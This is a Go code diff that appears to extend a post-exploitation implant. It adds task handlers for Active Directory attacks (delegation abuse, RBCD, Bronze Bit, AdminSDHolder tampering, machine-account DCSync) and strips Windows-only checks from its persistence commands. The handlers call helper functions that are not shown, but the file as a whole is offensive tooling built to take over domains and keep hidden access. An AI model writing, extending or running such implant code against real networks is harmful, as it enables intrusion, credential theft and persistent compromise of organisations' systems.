@@ -191,6 +191,121 @@ func handlePassTheHash(task Task, res *TaskResult) {
 	}
 }
 
+func handleFindDelegation(task Task, res *TaskResult) {
+	if runtime.GOOS != "windows" {
+		res.Error = "find_delegation is Windows-only"
+		return
+	}
+	hosts, err := findUnconstrainedDelegation()
+	if err != nil {
+		res.Error = err.Error()
+		return
+	}
+	out := "Unconstrained Delegation Targets:\n"
+	for _, h := range hosts {
+		out += "  " + h + "\n"
+	}
+	if len(hosts) == 0 {
+		out += "  (none found)\n"
+	}
+	res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+	res.Encoding = "base64"
+}
+
+func handleConstrainedDeleg(task Task, res *TaskResult) {
+	if runtime.GOOS != "windows" {
+		res.Error = "constrained_deleg is Windows-only"
+		return
+	}
+	parts := strings.SplitN(task.Command, "|", 2)
+	if len(parts) < 2 {
+		res.Error = "format: userPrincipal|targetSPN"
+		return
+	}
+	out, err := abuseConstrainedDelegation(parts[0], parts[1])
+	if err != nil {
+		res.Error = err.Error()
+	} else {
+		res.Output = base64.StdEncoding.EncodeToString(out)
+		res.Encoding = "base64"
+	}
+}
+
+func handleRBCD(task Task, res *TaskResult) {
+	if runtime.GOOS != "windows" {
+		res.Error = "rbcd is Windows-only"
+		return
+	}
+	parts := strings.SplitN(task.Command, "|", 3)
+	if len(parts) < 3 {
+		res.Error = "format: targetComputer|attackerComputer|domainAdmin"
+		return
+	}
+	err := abuseRBCD(parts[0], parts[1], parts[2])
+	if err != nil {
+		res.Error = err.Error()
+	} else {
+		res.Output = base64.StdEncoding.EncodeToString([]byte("RBCD abuse completed"))
+		res.Encoding = "base64"
+	}
+}
+
+func handleBronzeBit(task Task, res *TaskResult) {
+	if runtime.GOOS != "windows" {
+		res.Error = "bronze_bit is Windows-only"
+		return
+	}
+	parts := strings.SplitN(task.Command, "|", 2)
+	if len(parts) < 2 {
+		res.Error = "format: targetSPN|userPrincipal"
+		return
+	}
+	out, err := bronzeBitAttack(parts[0], parts[1])
+	if err != nil {
+		res.Error = err.Error()
+	} else {
+		res.Output = base64.StdEncoding.EncodeToString(out)
+		res.Encoding = "base64"
+	}
+}
+
+func handleAdminSDHolder(task Task, res *TaskResult) {
+	if runtime.GOOS != "windows" {
+		res.Error = "adminsdholder is Windows-only"
+		return
+	}
+	err := modifyAdminSDHolder(task.Command)
+	if err != nil {
+		res.Error = err.Error()
+	} else {
+		res.Output = base64.StdEncoding.EncodeToString([]byte("AdminSDHolder modified"))
+		res.Encoding = "base64"
+	}
+}
+
+func handleDCSyncMachine(task Task, res *TaskResult) {
+	if runtime.GOOS != "windows" {
+		res.Error = "dcsync_machine is Windows-only"
+		return
+	}
+	parts := strings.SplitN(task.Command, "|", 3)
+	if len(parts) < 2 {
+		res.Error = "format: domain|targetUser[|dcIP]"
+		return
+	}
+	dcIP := ""
+	if len(parts) > 2 {
+		dcIP = parts[2]
+	}
+	out, err := dcsyncMachineAccount(parts[0], parts[1], dcIP)
+	if err != nil {
+		res.Error = err.Error()
+	} else {
+		res.Output = base64.StdEncoding.EncodeToString(out)
+		res.Encoding = "base64"
+	}
+}
+
 func handlePassTheTicket(task Task, res *TaskResult) {
 	if runtime.GOOS != "windows" {
 		res.Error = "pass_the_ticket is Windows-only"
@@ -280,19 +395,11 @@ func handlePersistenceAdd(task Task, res *TaskResult) {
 	if len(parts) > 1 {
 		args = parts[1]
 	}
-	if runtime.GOOS != "windows" {
-		res.Error = "persistence is Windows-only"
-	} else {
-		res.Output = applyPersistence(method, args)
-	}
+	res.Output = applyPersistence(method, args)
 }
 
 func handlePersistenceList(task Task, res *TaskResult) {
-	if runtime.GOOS != "windows" {
-		res.Error = "persistence is Windows-only"
-	} else {
-		res.Output = listPersistence()
-	}
+	res.Output = listPersistence()
 }
 
 func handlePersistenceRemove(task Task, res *TaskResult) {
@@ -302,9 +409,5 @@ func handlePersistenceRemove(task Task, res *TaskResult) {
 	if len(parts) > 1 {
 		args = parts[1]
 	}
-	if runtime.GOOS != "windows" {
-		res.Error = "persistence is Windows-only"
-	} else {
-		res.Output = removePersistence(method, args)
-	}
+	res.Output = removePersistence(method, args)
 }
